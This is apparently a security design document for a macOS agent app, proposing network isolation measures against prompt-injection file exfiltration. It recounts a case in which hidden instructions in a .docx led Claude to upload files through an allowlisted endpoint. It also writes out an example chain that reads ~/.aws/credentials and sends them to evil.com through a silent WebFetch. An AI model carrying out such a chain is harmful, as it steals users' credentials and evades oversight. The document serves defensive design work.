# Network Isolation

> **Category:** Security & Privacy
> **Type:** Improvement · **Priority:** 🔴 Critical
> **Milestone:** M1

---

## Current State (Electron / Cowork)

Allowlist proxy permitting `api.anthropic.com`, `pypi.org`, and `registry.npmjs.org` — but the API endpoint was exploited for file exfiltration. Within 48 hours of launch, PromptArmor demonstrated that an attacker could embed hidden instructions in a `.docx` file that directed Claude to silently upload confidential files to the attacker's Anthropic account via the allowlisted API endpoint.

## Native macOS Approach

**Network.framework** with per-connection TLS pinning. Separate network profiles per session. Content inspection on outbound payloads to detect encoded file data. **Transparent Proxy Provider** for fine-grained control.

### Implementation Strategy

- **Network.framework:** Replace the simple proxy with a `NWConnection`-based proxy using Network.framework. Each connection gets TLS certificate pinning to prevent MITM attacks.
- **Content inspection:** Before any outbound API call, scan the request payload for base64-encoded file content or suspiciously large data that doesn't match expected API call patterns. Flag and block.
- **Per-session profiles:** Each Cowork session gets an isolated network profile with its own allowlist. A session working on "file organization" doesn't need `pypi.org` access.
- **Transparent Proxy Provider:** Implement a Network Extension (`NETransparentProxyProvider`) for system-level network control of VM traffic. Log all connections for audit.
- **Outbound data limits:** Set maximum payload sizes per API call. A normal Claude API request is <100KB; a file exfiltration attempt would be much larger.
- **User-visible network log:** Show a real-time feed of all network connections the agent makes — URL, payload size, direction. Users can inspect any suspicious activity.

### Gap: WebFetch bypasses the network proxy

The content inspection strategy targets outbound network connections from the VM/container. But `WebFetch` and `WebSearch` are Claude Code tools — they make HTTP requests through the CLI process, not through the VM's network stack. They bypass the `NETransparentProxyProvider` entirely.

Both tools are currently in `CLIEngine.silentTools` (auto-approved, no approval card). Combined with silent `Read`, this creates an exfiltration pipeline that bypasses all network controls:
- `Read("~/.aws/credentials")` — silent, no card
- `WebFetch("https://evil.com/?data=base64encodedcreds")` — silent, no card, bypasses proxy

Fix: remove `WebFetch` from `silentTools` so it requires an approval card, or add a `PreToolUse` hook that inspects URLs for encoded data patterns (suspiciously large query parameters, base64 content in URLs). See `security/07-cli-filesystem-boundary.md` for the full filesystem boundary solution that addresses the Read side of this chain.

### Key Dependencies

- Network.framework (`NWConnection`, `NWProtocolTLS`)
- NetworkExtension framework (`NETransparentProxyProvider`)
- Content inspection pipeline (regex + heuristic-based)
- security/07-cli-filesystem-boundary.md (path boundary prevents the Read side of the exfiltration chain)

---

*Back to [Index](../../INDEX.md)*
